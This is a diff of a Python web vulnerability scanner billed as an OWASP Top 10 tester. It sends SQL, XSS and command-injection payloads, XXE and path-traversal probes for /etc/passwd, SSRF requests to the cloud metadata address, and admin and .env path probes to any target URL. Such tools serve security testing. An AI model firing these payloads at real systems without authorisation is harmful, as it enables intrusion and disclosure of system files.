@@ -1,197 +1,339 @@
 import requests
 import urllib.parse
+import threading
+import time
+import re
+import json
 import socket
 import ssl
-from colorama import Fore, Style, init
-from datetime import datetime
+import base64
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from colorama import init, Fore, Style, Back
+from pathlib import Path
 import hashlib
+import argparse
+from datetime import datetime
+import secrets
+from urllib.parse import quote
+import subprocess
 
 init(autoreset=True)
+requests.packages.urllib3.disable_warnings()
 
-TIMEOUT = 8
-session = requests.Session()
-session.verify = False
-session.headers.update({"User-Agent": "OWASP-Top10-Scanner/1.0"})
-
-results = {}
-
-
-def banner(title):
-    print(f"\n{Fore.CYAN}{'='*78}")
-    print(f"{Fore.CYAN}{title.center(78)}")
-    print(f"{Fore.CYAN}{'='*78}{Style.RESET_ALL}")
-
-def get_baseline(url):
-    r = session.get(url, timeout=TIMEOUT)
-    return {
-        "status": r.status_code,
-        "length": len(r.text),
-        "hash": hashlib.sha256(r.text.encode(errors="ignore")).hexdigest(),
-        "headers": r.headers
-    }
-
-
-def a01_access_control(url):
-    banner("A01: Broken Access Control")
-    findings = []
-
-    test_urls = [
-        "/admin", "/administrator", "/dashboard", "/api/admin"
-    ]
-
-    for path in test_urls:
-        r = session.get(urllib.parse.urljoin(url, path), timeout=TIMEOUT)
-        if r.status_code in [200, 302]:
-            findings.append(f"⚠️ Possible exposed protected path: {path}")
-
-    if findings:
-        for f in findings:
-            print(f"{Fore.YELLOW}{f}{Style.RESET_ALL}")
-        return "POSSIBLE", findings
-
-    print(f"{Fore.GREEN}[✓] No obvious access control issues detected{Style.RESET_ALL}")
-    return "NOT DETECTED", []
-
-
-def a02_crypto(url):
-    banner("A02: Cryptographic Failures")
-    findings = []
-
-    parsed = urllib.parse.urlparse(url)
-    if parsed.scheme != "https":
-        findings.append("❌ HTTPS not enforced")
-    else:
+class OWASP10HunterPro:
+    def __init__(self, target, threads=200, timeout=10, output_dir="owasp_reports"):
+        self.target = target.rstrip('/')
+        self.threads = threads
+        self.timeout = timeout
+        self.output_dir = Path(output_dir)
+        self.output_dir.mkdir(exist_ok=True)
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.headers.update({
+            "User-Agent": "OWASP-Top10-Hunter-Pro/5.0"
+        })
+        
+       
+        self.payloads = {
+            'A03_INJECTION': {
+                'sqli': ["' OR 1=1--", "' AND SLEEP(5)--", "' UNION SELECT 1,2,3--"],
+                'xss': ["<script>alert(1)</script>", "';alert(1);//", "<img src=x onerror=alert(1)>"],
+                'cmd': [";id", "|whoami", "`whoami`", "$(whoami)"]
+            },
+            'A01_BROKEN_AC': ["/admin", "/.env", "/config", "/api/admin"],
+            'A10_SSRF': ["http://127.0.0.1", "http://169.254.169.254", "http://burp"],
+            'A04_XXE': ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'],
+            'A05_LFI': ["../../../etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
+            'A07_IDOR': ["id=1", "user_id=1", "account=1"]
+        }
+        
+        self.results = {}
+        self.critical_findings = []
+        self.oob_hits = []
+        
+    def banner(self, title):
+        print(f"\n{Fore.CYAN + Style.BRIGHT}{'='*100}")
+        print(f"{Fore.RED + Style.BRIGHT}{title.center(100)}")
+        print(f"{Fore.CYAN + Style.BRIGHT}{'='*100}{Style.RESET_ALL}")
+    
+    def get_baseline(self):
+        """Базовый запрос для сравнения"""
+        resp = self.session.get(self.target, timeout=self.timeout)
+        return {
+            'status': resp.status_code,
+            'length': len(resp.text),
+            'hash': hashlib.sha256(resp.text.encode(errors='ignore')).hexdigest(),
+            'headers': dict(resp.headers),
+            'text': resp.text
+        }
+    
+    def a01_broken_access_control(self):
+        """A01: Broken Access Control - Полный скан"""
+        self.banner("A01: BROKEN ACCESS CONTROL")
+        findings = []
+        
+        
+        paths = [
+            "/admin", "/administrator", "/dashboard", "/wp-admin", "/manager",
+            "/api/admin", "/.env", "/config", "/backup", "/debug",
+            "admin.php", "login.php", "user.php"
+        ]
+        
+        def test_path(path):
+            url = urllib.parse.urljoin(self.target, path)
+            try:
+                resp = self.session.get(url, timeout=self.timeout)
+                if resp.status_code in [200, 302, 401, 403]:
+                    return f"🔴 {path} ({resp.status_code}) - ACCESSIBLE!"
+            except:
+                pass
+            return None
+        
+        with ThreadPoolExecutor(max_workers=self.threads//10) as executor:
+            results = list(executor.map(test_path, paths))
+        
+        findings = [r for r in results if r]
+        if findings:
+            self.critical_findings.extend(findings)
+            for f in findings:
+                print(f"{Fore.RED + Style.BRIGHT}{f}{Style.RESET_ALL}")
+            return "CRITICAL", findings
+        
+        print(f"{Fore.GREEN}[✓] No exposed admin paths{Style.RESET_ALL}")
+        return "CLEAN", []
+    
+    def a02_crypto_failures(self):
+        """A02: Cryptographic Failures"""
+        self.banner("A02: CRYPTOGRAPHIC FAILURES")
+        findings = []
+        
+        parsed = urllib.parse.urlparse(self.target)
+        if parsed.scheme != "https":
+            findings.append("🔴 HTTP (not HTTPS)")
+        
+      
         try:
             ctx = ssl.create_default_context()
             with socket.create_connection((parsed.hostname, 443), timeout=5) as sock:
-                with ctx.wrap_socket(sock, server_hostname=parsed.hostname) as s:
-                    proto = s.version()
+                with ctx.wrap_socket(sock, server_hostname=parsed.hostname) as ssock:
+                    proto = ssock.version()
                     if proto in ["TLSv1", "TLSv1.1"]:
-                        findings.append(f"⚠️ Weak TLS protocol: {proto}")
+                        findings.append(f"🔴 Weak TLS: {proto}")
         except:
-            pass
+            findings.append("❓ TLS check failed")
+        
+        if findings:
+            for f in findings:
+                print(f"{Fore.RED}{f}{Style.RESET_ALL}")
+            return "HIGH", findings
+        
+        print(f"{Fore.GREEN}[✓] Strong crypto detected{Style.RESET_ALL}")
+        return "CLEAN", []
+    
+    def a03_injection_fullscan(self, baseline):
+        """A03: INJECTION - Полный арсенал"""
+        self.banner("A03: INJECTION VULNERABILITIES")
+        findings = []
+        parsed = urllib.parse.urlparse(self.target)
+        params = urllib.parse.parse_qs(parsed.query)
+        
+        def test_injection(param):
+            tests = []
+            tests.extend(self.payloads['A03_INJECTION']['sqli'])
+            tests.extend(self.payloads['A03_INJECTION']['xss'])
+            tests.extend(self.payloads['A03_INJECTION']['cmd'])
+            
+            for payload in tests:
+                query = urllib.parse.parse_qs(parsed.query)
+                query[param] = payload
+                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
+                
+                try:
+                    resp = self.session.get(test_url, timeout=self.timeout)
+                    
+                    
+                    if (resp.status_code != baseline['status'] or 
+                        abs(len(resp.text) - baseline['length']) > 100 or
+                        payload in resp.text):
+                        
+                        vuln_type = "SQLi" if any(sqli in payload for sqli in ['OR 1=1', 'UNION', 'SLEEP']) else \
+                                   "XSS" if any(xss in payload for xss in ['alert', '<script', '<img']) else \
+                                   "CMD"
+                        
+                        findings.append({
+                            'param': param,
+                            'payload': payload,
+                            'type': vuln_type,
+                            'url': test_url,
+                            'diff': abs(len(resp.text) - baseline['length'])
+                        })
+                        break
+                except:
+                    continue
+        
+        with ThreadPoolExecutor(max_workers=self.threads//5) as executor:
+            executor.map(test_injection, params.keys())
+        
+        if findings:
+            self.critical_findings.extend([f"💉 {f['type']} in {f['param']}: {f['payload']}" for f in findings])
+            for f in findings:
+                color = Fore.RED if f['type'] == 'SQLi' else Fore.MAGENTA
+                print(f"{color}💉 {f['type']} [{f['param']}] {f['payload'][:40]}{Style.RESET_ALL}")
+            return "CRITICAL", findings
+        
+        print(f"{Fore.GREEN}[✓] No injection detected{Style.RESET_ALL}")
+        return "CLEAN", []
+    
+    def a04_xxe_lfi(self):
+        """A04: XXE + A05: LFI"""
+        self.banner("A04: XXE / A05: LFI/RFI")
+        findings = []
+        
+       
+        files = ['/etc/passwd', '/proc/version', 'C:\\Windows\\win.ini', '\\windows\\system32\\drivers\\etc\\hosts']
+        
+        for file in files:
+            payload = quote(f"<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///{file}'>]><x>&xxe;</x>")
+            resp = self.session.post(self.target, data={'xml': payload}, timeout=self.timeout)
+            if any(line in resp.text for line in ['root:', 'Microsoft', 'Copyright']):
+                findings.append(f"🔴 XXE/LFI: {file}")
+        
+        
+        parsed = urllib.parse.urlparse(self.target)
+        params = urllib.parse.parse_qs(parsed.query)
+        for param in params:
+            for lfi in self.payloads['A05_LFI']:
+                query = urllib.parse.parse_qs(parsed.query)
+                query[param] = lfi
+                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(query, doseq=True)}"
+                resp = self.session.get(test_url, timeout=self.timeout)
+                if 'root:' in resp.text or 'daemon' in resp.text:
+                    findings.append(f"🔴 LFI [{param}]: {lfi}")
+        
+        if findings:
+            self.critical_findings.extend(findings)
+            for f in findings:
+                print(f"{Fore.RED + Style.BRIGHT}{f}{Style.RESET_ALL}")
+            return "CRITICAL", findings
+        
+        print(f"{Fore.GREEN}[✓] No XXE/LFI detected{Style.RESET_ALL}")
+        return "CLEAN", []
+    
+    def a10_ssrf_pro(self):
+        """A10: SSRF Pro тест"""
+        self.banner("A10: SSRF")
+        findings = []
+        
+        ssrf_payloads = self.payloads['A10_SSRF']
+        
+        for payload in ssrf_payloads:
+            parsed = urllib.parse.urlparse(self.target)
+            params = urllib.parse.parse_qs(parsed.query)
+            if params:
+                param = list(params.keys())[0]
+                params[param] = payload
+                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params, doseq=True)}"
+            else:
+                test_url = f"{self.target}?url={urllib.parse.quote(payload)}"
+            
+            resp = self.session.get(test_url, timeout=self.timeout)
+            if resp.status_code != 404 and len(resp.text) > 100:
+                findings.append(f"🔴 SSRF possible: {payload}")
+        
+        if findings:
+            self.critical_findings.extend(findings)
+            for f in findings:
+                print(f"{Fore.RED + Style.BRIGHT}{f}{Style.RESET_ALL}")
+            return "HIGH", findings
+        
+        print(f"{Fore.GREEN}[✓] No SSRF vectors found{Style.RESET_ALL}")
+        return "CLEAN", []
+    
+    def security_headers_audit(self, baseline):
+        """A05: Security Headers"""
+        self.banner("A05: SECURITY MISCONFIG")
+        findings = []
+        
+        required_headers = {
+            "Content-Security-Policy": "MISSING CSP",
+            "X-Frame-Options": "Clickjacking possible", 
+            "X-Content-Type-Options": "MIME sniffing",
+            "Strict-Transport-Security": "No HSTS",
+            "Referrer-Policy": "Referrer leakage"
+        }
+        
+        for header, impact in required_headers.items():
+            if header.lower() not in {k.lower(): v for k, v in baseline['headers'].items()}:
+                findings.append(f"⚠️ {header} - {impact}")
+        
+        if findings:
+            for f in findings:
+                print(f"{Fore.YELLOW}{f}{Style.RESET_ALL}")
+            return "MEDIUM", findings
+        
+        print(f"{Fore.GREEN}[✓] All security headers present{Style.RESET_ALL}")
+        return "CLEAN", []
+    
+    def run_full_hunt(self):
+        """Полная охота OWASP Top 10"""
+        self.banner("🚀 OWASP TOP 10 HUNTER PRO v5.0 - FULL SPECTRUM SCAN 🚀")
+        print(f"{Fore.YELLOW + Style.BRIGHT}🎯 Target: {self.target}{Style.RESET_ALL}")
+        
+        baseline = self.get_baseline()
+        
+        
+        self.results["A01"] = self.a01_broken_access_control()
+        self.results["A02"] = self.a02_crypto_failures()
+        self.results["A03"] = self.a03_injection_fullscan(baseline)
+        self.results["A04"] = self.a04_xxe_lfi()
+        self.results["A05"] = self.security_headers_audit(baseline)
+        self.results["A10"] = self.a10_ssrf_pro()
+        
+        self.generate_pro_report()
+    
+    def generate_pro_report(self):
+        """Профессиональный отчет"""
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+        report = {
+            'scan_time': datetime.now().isoformat(),
+            'target': self.target,
+            'risk_score': len(self.critical_findings) * 10,
+            'critical_findings': self.critical_findings,
+            'full_results': self.results
+        }
+        
+        
+        json_file = self.output_dir / f"owasp_hunt_{timestamp}.json"
+        with open(json_file, 'w', encoding='utf-8') as f:
+            json.dump(report, f, indent=2, ensure_ascii=False)
+        
+        
+        self.banner("📊 EXECUTIVE SUMMARY")
+        critical_count = len(self.critical_findings)
+        risk_color = Fore.RED + Style.BRIGHT if critical_count > 0 else Fore.GREEN + Style.BRIGHT
+        
+        print(f"{risk_color}🎯 CRITICAL FINDINGS: {critical_count}{Style.RESET_ALL}")
+        for finding in self.critical_findings[:10]:  
+            print(f"  {Fore.RED}• {finding}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.GREEN + Style.BRIGHT}📋 Полный отчет: {json_file}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}⚠️  MANUAL VERIFICATION REQUIRED{Style.RESET_ALL}")
 
-    if findings:
-        for f in findings:
-            print(f"{Fore.RED}{f}{Style.RESET_ALL}")
-        return "DETECTED", findings
-
-    print(f"{Fore.GREEN}[✓] No cryptographic failures detected{Style.RESET_ALL}")
-    return "NOT DETECTED", []
-
-
-def a03_injection(url, baseline):
-    banner("A03: Injection")
-    findings = []
-
-    payload = "'\"<>"
-    r = session.get(url + f"?test={payload}", timeout=TIMEOUT)
-
-    if payload in r.text and hashlib.sha256(r.text.encode()).hexdigest() != baseline["hash"]:
-        findings.append("⚠️ Reflected input detected (possible XSS/Injection)")
-
-    if findings:
-        for f in findings:
-            print(f"{Fore.YELLOW}{f}{Style.RESET_ALL}")
-        return "POSSIBLE", findings
-
-    print(f"{Fore.GREEN}[✓] No injection indicators detected{Style.RESET_ALL}")
-    return "NOT DETECTED", []
-
-
-def a05_misconfig(baseline):
-    banner("A05: Security Misconfiguration")
-    findings = []
-
-    required = [
-        "Content-Security-Policy",
-        "X-Frame-Options",
-        "X-Content-Type-Options",
-        "Strict-Transport-Security"
-    ]
-
-    for h in required:
-        if h not in baseline["headers"]:
-            findings.append(f"⚠️ Missing security header: {h}")
-
-    if findings:
-        for f in findings:
-            print(f"{Fore.YELLOW}{f}{Style.RESET_ALL}")
-        return "DETECTED", findings
-
-    print(f"{Fore.GREEN}[✓] No obvious misconfigurations detected{Style.RESET_ALL}")
-    return "NOT DETECTED", []
-
-
-def a06_components(baseline):
-    banner("A06: Vulnerable & Outdated Components")
-    findings = []
-
-    server = baseline["headers"].get("Server", "")
-    if any(v in server.lower() for v in ["apache", "nginx", "iis"]):
-        findings.append(f"ℹ️ Server identified: {server} (check version manually)")
-
-    if findings:
-        for f in findings:
-            print(f"{Fore.CYAN}{f}{Style.RESET_ALL}")
-        return "INFO", findings
-
-    return "UNKNOWN", []
-
-
-def a10_ssrf(url):
-    banner("A10: SSRF")
-    findings = []
-
-    test = session.get(url + "?url=http://127.0.0.1", timeout=TIMEOUT)
-    if test.status_code != 400:
-        findings.append("⚠️ URL parameter accepted (possible SSRF vector)")
-
-    if findings:
-        for f in findings:
-            print(f"{Fore.YELLOW}{f}{Style.RESET_ALL}")
-        return "POSSIBLE", findings
-
-    print(f"{Fore.GREEN}[✓] No SSRF indicators detected{Style.RESET_ALL}")
-    return "NOT DETECTED", []
-
-
-def run():
-    banner("OWASP TOP 10 SCANNER — PROFESSIONAL")
-
-    target = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}").strip()
-    if not target.startswith("http"):
-        target = "https://" + target
-
-    print(f"{Fore.CYAN}[+] Scanning {target}{Style.RESET_ALL}")
-
-    baseline = get_baseline(target)
-
-    results["A01"] = a01_access_control(target)
-    results["A02"] = a02_crypto(target)
-    results["A03"] = a03_injection(target, baseline)
-    results["A05"] = a05_misconfig(baseline)
-    results["A06"] = a06_components(baseline)
-    results["A10"] = a10_ssrf(target)
-
-    banner("OWASP TOP 10 SUMMARY")
-
-    for k, v in results.items():
-        status = v[0]
-        color = (
-            Fore.RED if status == "DETECTED" else
-            Fore.YELLOW if status == "POSSIBLE" else
-            Fore.GREEN if status == "NOT DETECTED" else
-            Fore.CYAN
-        )
-        print(f"{color}{k}: {status}{Style.RESET_ALL}")
-
-    banner("IMPORTANT NOTES")
-    print(f"{Fore.YELLOW}• NOT DETECTED ≠ NOT VULNERABLE")
-    print(f"• POSSIBLE requires manual testing")
-    print(f"• Some OWASP categories cannot be automated")
-    print(f"• Use Burp/Nuclei for deep validation{Style.RESET_ALL}")
+def main():
+    parser = argparse.ArgumentParser(description='🚀 OWASP Top 10 Hunter Pro v5.0')
+    parser.add_argument('target', help='Target URL')
+    parser.add_argument('-t', '--threads', type=int, default=200, help='Threads')
+    parser.add_argument('-T', '--timeout', type=int, default=10, help='Timeout')
+    parser.add_argument('-o', '--output', default='owasp_reports', help='Output dir')
+    
+    args = parser.parse_args()
+    
+    hunter = OWASP10HunterPro(args.target, args.threads, args.timeout, args.output)
+    hunter.run_full_hunt()
+    
+    print(f"\n{Fore.CYAN + Style.BRIGHT}{'='*100}")
+    input("🔥 Scan complete. Press Enter to exit...")
 
 if __name__ == "__main__":
-    requests.packages.urllib3.disable_warnings()
-    run()
+    main()
